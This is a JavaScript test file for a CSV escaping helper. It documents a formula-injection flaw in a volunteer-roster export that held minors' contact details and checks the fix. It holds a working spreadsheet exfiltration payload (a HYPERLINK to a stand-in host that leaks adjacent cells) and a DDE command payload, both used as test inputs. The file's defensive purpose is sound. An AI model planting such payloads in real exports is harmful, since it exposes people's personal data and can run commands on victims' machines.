import { describe, it, expect } from 'vitest';
import { readFileSync, readdirSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { csvCell, csvRow, CSV_FORMULA_LEAD } from './csv.js';

/**
 * CSV cells, and why there is exactly one function that makes them.
 *
 * ── The defect ──
 *
 * Three places built CSV. Two of them escaped quotes and stopped there:
 *
 *   • `routes/attendanceRoutes.js` — `cell()`, the accepted-event roster, which
 *     the code's own comment calls "the one bulk export of minors' contact
 *     details on the platform".
 *   • `views/OrganizerDashboard.jsx` — `escCell()`, the client-side roster
 *     ledger, same data.
 *
 * The third, `routes/adminRoutes.js`, had `sanitizeCsv()`, which also prefixed a
 * leading `=`, `+`, `-`, `@`, tab or CR with an apostrophe.
 *
 * Nothing restricts the charset of `users.name` — `accountValidation.js` checks
 * type, non-emptiness and a 100-character ceiling, which is right for a name
 * field. So a student could set their name to
 *
 *     =HYPERLINK("https://evil.example/?d="&A1&B1,"Click")
 *
 * and an organizer opening the roster in Excel or Sheets would evaluate it. The
 * adjacent cells are the names, emails, schools and grades of everybody accepted
 * to that shift. That is exfiltration of minors' contact details, triggered by
 * the victim doing the ordinary thing with a file the product told them to
 * download.
 *
 * ── Why the guard below is the important half of this file ──
 *
 * The unit cases pin the behaviour. They would not have prevented this bug,
 * because the bug was not a wrong implementation — `adminRoutes` had the right
 * one. It was that three call sites each wrote their own, and the two written by
 * whoever needed a roster did not know the third existed.
 *
 * So the thing to guard is that **there is no local cell function left to copy**.
 * Same reasoning as `tooling.privilegedDbPath.test.js`, which guards that no
 * privileged script resolves its own database path: fixing the instances does
 * not stop the fourth one being written next month by someone who copies their
 * nearest neighbour.
 */

const here = path.dirname(fileURLToPath(import.meta.url));
const repoRoot = path.join(here, '..');

describe('csvCell', () => {
  it('quotes every value and doubles embedded quotes', () => {
    expect(csvCell('Ava Chen')).toBe('"Ava Chen"');
    expect(csvCell('Ava "Ace" Chen')).toBe('"Ava ""Ace"" Chen"');
  });

  it('keeps a comma or newline inside the quoted cell rather than breaking the row', () => {
    expect(csvCell('Chen, Ava')).toBe('"Chen, Ava"');
    expect(csvCell('line one\nline two')).toBe('"line one\nline two"');
  });

  it('neutralises every formula lead character', () => {
    /* The whole set, each asserted rather than sampled — a regex edit that drops
       one of them is the exact shape of this defect returning. */
    for (const lead of ['=', '+', '-', '@', '\t', '\r']) {
      const out = csvCell(`${lead}HYPERLINK("http://evil.example")`);
      expect(out.startsWith(`"'${lead}`), `lead ${JSON.stringify(lead)} not neutralised: ${out}`).toBe(true);
    }
  });

  it('neutralises the exfiltration payload that motivated this', () => {
    const payload = '=HYPERLINK("https://evil.example/?d="&A1&B1,"Click")';
    const out = csvCell(payload);
    /* Apostrophe-prefixed, so a spreadsheet stores it as text. The characters
       are all still there — this is not sanitisation, and a reader must be able
       to see what somebody actually typed. */
    expect(out).toBe(`"'${payload.replace(/"/g, '""')}"`);
    expect(out).toContain('HYPERLINK');
  });

  it('neutralises the DDE command payload', () => {
    expect(csvCell("=cmd|'/c calc'!A1")).toBe(`"'=cmd|'/c calc'!A1"`);
  });

  it('leaves an ordinary value that merely contains a formula character alone', () => {
    /* Only the FIRST character is a formula trigger, so a hyphenated surname or
       an email must not gain an apostrophe. */
    expect(csvCell('Ava-Rose Chen')).toBe('"Ava-Rose Chen"');
    expect(csvCell('ava@school.org')).toBe('"ava@school.org"');
    expect(csvCell('Grade 9 = fun')).toBe('"Grade 9 = fun"');
  });

  it('renders null, undefined and zero without inventing or losing a value', () => {
    /* `String(value || '')` — which one of the two originals used — turns 0 into
       an empty cell. A grade or an hours total of 0 is a real value. */
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
    expect(csvCell(0)).toBe('"0"');
    expect(csvCell(false)).toBe('"false"');
  });

  it('exports the lead set so a caller cannot re-derive a different one', () => {
    expect(CSV_FORMULA_LEAD.test('=x')).toBe(true);
    expect(CSV_FORMULA_LEAD.test('x=')).toBe(false);
  });
});

describe('csvRow', () => {
  it('joins cells with commas, each independently quoted', () => {
    expect(csvRow(['Ava', 'ava@school.org', 9])).toBe('"Ava","ava@school.org","9"');
  });

  it('neutralises a formula anywhere in the row', () => {
    expect(csvRow(['ok', '=1+1'])).toBe(`"ok","'=1+1"`);
  });
});

describe('no module builds its own CSV cell', () => {
  /**
   * Scans source for a locally-defined cell/escape function whose body quotes a
   * value. Deliberately narrow: it matches the shape all three originals had
   * (an arrow function returning a template string that wraps the value in
   * double quotes) rather than trying to recognise CSV in general.
   */
  const SUSPECT = /=>\s*`"\$\{/;

  function sourceFiles(dir, acc = []) {
    for (const entry of readdirSync(dir, { withFileTypes: true })) {
      if (entry.name === 'node_modules' || entry.name === 'dist' || entry.name.startsWith('.')) continue;
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) sourceFiles(full, acc);
      else if (/\.(js|jsx)$/.test(entry.name) && !/\.test\.(js|jsx)$/.test(entry.name)) acc.push(full);
    }
    return acc;
  }

  it('has no local cell function left for a fourth caller to copy', () => {
    const offenders = [];
    for (const file of [
      ...sourceFiles(path.join(repoRoot, 'server')),
      ...sourceFiles(path.join(repoRoot, 'src')),
    ]) {
      const source = readFileSync(file, 'utf8');
      if (SUSPECT.test(source)) offenders.push(path.relative(repoRoot, file));
    }

    expect(
      offenders,
      'These build a quoted cell inline. Import csvCell/csvRow from server/csv.js '
      + 'instead — a local copy is how the roster export came to lack the '
      + 'formula-injection guard that the admin export already had.'
    ).toEqual([]);
  });
});
